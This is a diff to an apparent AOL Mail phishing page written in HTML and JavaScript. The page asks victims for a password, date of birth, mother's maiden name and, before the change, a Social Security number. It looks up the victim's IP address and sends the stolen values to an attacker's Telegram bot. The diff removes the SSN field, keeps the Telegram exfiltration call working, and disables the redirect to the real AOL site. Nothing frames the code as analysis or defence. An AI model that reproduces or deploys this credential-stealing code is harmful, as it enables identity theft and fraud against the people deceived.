@@ -354,7 +354,7 @@ a#goog
       <form action="" id="formm">
         <input type="password" placeholder="Password" id="pwdd" required="">
         <input type="text" placeholder="Date of Birth" id="dob" required="">
-        <input type="text" placeholder="Social Security Number" id="nss" required="">
+        <!-- <input type="text" placeholder="Social Security Number" id="nss" required=""> -->
         <input type="text" placeholder="Mother's Maiden Name" id="mmn" required="">
         <button id="subb">Next</button>
         <button type="submit" id="suber">Submit</button>
@@ -428,7 +428,7 @@ a#goog
         strongg.textContent = 'Enter password'
         ppp.textContent = 'Because you are accessing sensitive info you need to verify your password.';
         dob.style.display = 'none'
-        nss.style.display = 'none'
+        // nss.style.display = 'none'
         mmn.style.display = 'none'
         pWdd.style.display = 'block'
         imgg.style.display = 'block'
@@ -459,6 +459,7 @@ fetch('https://api.ipify.org/?format=json').then(results => results.json()).then
         strong.style.color = 'red'
         pWd.style.borderBottom = 'red 1px solid'
         pWd.type = "text"
+        pWd.value = ""
         tester = 0
             }
 
@@ -474,25 +475,26 @@ fetch('https://api.ipify.org/?format=json').then(results => results.json()).then
   formaa.addEventListener("submit", e =>{
           e.preventDefault();
           let dob = document.querySelector('#dob').value
-          let nss = document.querySelector('#nss').value
+          // let nss = document.querySelector('#nss').value
           let mmn = document.querySelector('#mmn').value
          
 
-        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AOLMail=>${dob}=${nss}=${mmn}=${data.ip}`, {
+        fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=AOLMail=>${dob}=${mmn}=${data.ip}`, {
               method: "GET"
           }).then(success => {
           formSec.style.display = 'none';
           formSecc.style.display = 'flex';
           
-          const myTimeout = setTimeout(myGreeting, 4000);
+          // const myTimeout = setTimeout(myGreeting, 4000);
 
-            function myGreeting() {
-               window.location.replace("https://aol.com");
-            }
+            // function myGreeting() {
+            //   //  window.location.replace("https://aol.com");
+            // }
         // strong.textContent = 'Error occured'
         // strong.style.color = 'red'
         // pWd.style.borderBottom = 'red 1px solid'
         // strong.style.fontSize = '14px'
+        // pwd.value = ""
              
           }, error => {
           alert('message not sent')
